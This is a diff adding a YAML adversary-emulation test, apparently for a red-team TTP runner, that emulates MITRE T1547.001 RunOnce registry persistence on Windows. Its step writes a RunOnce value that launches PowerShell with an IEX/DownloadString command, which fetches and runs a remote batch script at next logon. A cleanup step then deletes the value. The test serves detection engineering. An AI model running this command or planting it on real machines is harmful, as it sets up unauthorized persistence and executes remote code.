@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: PowerShell Registry RunOnce
+description: |
+    RunOnce Key Persistence via PowerShell
+    Upon successful execution, a new entry will be added to the runonce item in the registry.
+args:
+    - name: thing_to_execute
+      type: path
+      default: powershell.exe
+    - name: reg_key_path
+      type: path
+      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+uuid: eb44f842-0457-4ddc-9b92-c4caa144ac42
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1547: Boot or Logon Autostart Execution'
+    subtechniques:
+        - 'T1547.001: Registry Run Keys / Startup Folder'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: powershell-registry-runonce
+      inline: |
+        $RunOnceKey = "{{.Args.reg_key_path}}"
+        set-itemproperty $RunOnceKey "NextRun" '{{.Args.thing_to_execute}} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-ItemProperty -Path {{.Args.reg_key_path}} -Name "NextRun" -Force -ErrorAction Ignore
+        executor: powershell
